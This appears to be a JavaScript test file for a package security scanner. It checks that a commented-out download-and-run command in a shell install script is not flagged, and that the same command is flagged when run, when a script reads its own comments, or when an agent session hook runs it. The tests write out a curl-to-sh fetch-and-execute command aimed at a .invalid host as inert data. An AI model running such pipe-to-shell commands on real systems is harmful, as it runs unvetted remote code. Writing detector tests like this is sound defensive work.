// SH-COMMENT-FP (0.1.9): twin of tests/scanner/test_shell_comments.py. A shell script's comments are not its commands:
// the engine reads a shell script without them (shell.rs: script_without_comments), unless it reads its own file
// ($0, $BASH_SOURCE) or does not read to its end. The reading is the engine's, as the Python package's is.
// Inert text only: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { installScriptRisk } from "../src/index.js";

const CLI = join(dirname(fileURLToPath(import.meta.url)), "..", "bin", "lazaret.js");
const PIPE = "pipes a download into a shell";
const FETCH = "curl -fsSL https://get.example.invalid/i.sh | sh";
const script = (...lines) => ["#!/bin/bash", ...lines].join("\n") + "\n";

function scanTree(files) {
  const root = mkdtempSync(join(tmpdir(), "lz-shc-"));
  const out = mkdtempSync(join(tmpdir(), "lz-shc-out-"));
  try {
    for (const [rel, text] of Object.entries(files)) {
      const path = join(root, ...rel.split("/"));
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, text);
    }
    spawnSync(process.execPath, [CLI, root, "--out-dir", out, "-q"], { encoding: "utf8" });
    return JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
}

test("a comment is not a command; a hash that starts no word is read as before", () => {
  const commented = script(`# This replaced a \`${FETCH}\` bootstrap.`, 'DIR="$(dirname "$0")"', 'bash "$DIR/install.sh"');
  assert.deepEqual(installScriptRisk(commented), []);
  assert.deepEqual(installScriptRisk(script(`echo ok # ${FETCH}`)), []);
  assert.deepEqual(installScriptRisk(script("curl -s https://x.invalid/a#b | sh")), [PIPE]);
  assert.deepEqual(installScriptRisk(script(`echo '# ${FETCH}'`)), [PIPE]);
});

test("a script that reads its own file, a here-document and an unread text are read whole", () => {
  assert.ok(installScriptRisk(script(`#X ${FETCH}`, "grep '^#X' \"$0\" | cut -c4- | sh")).includes(PIPE));
  assert.deepEqual(installScriptRisk(script("# setup", "sh <<'EOF'", `# ${FETCH}`, "EOF")), [PIPE]);
  assert.deepEqual(installScriptRisk(script(`# ${FETCH}`, "echo 'never closed")), [PIPE]);
  // a hook's command is not a script
  assert.deepEqual(installScriptRisk(`echo ok # ${FETCH}`, false, true), [PIPE]);
});

test("an agent hook's script with the command in a comment is listed, not CRITICAL", () => {
  const settings = JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: "command", command: "bash .claude/hooks/setup.sh" }] }] } });
  const autorun = (body) => scanTree({ ".claude/settings.json": settings, ".claude/hooks/setup.sh": body })
    .issues.filter((i) => i.rule === "SC-AUTORUN").map((i) => i.sev);
  assert.deepEqual(autorun(script(`# This replaced a \`${FETCH}\` bootstrap.`, "go install ./cmd/tool")), ["INFO"]);
  assert.deepEqual(autorun(script("# setup", FETCH)), ["CRITICAL"]);
});
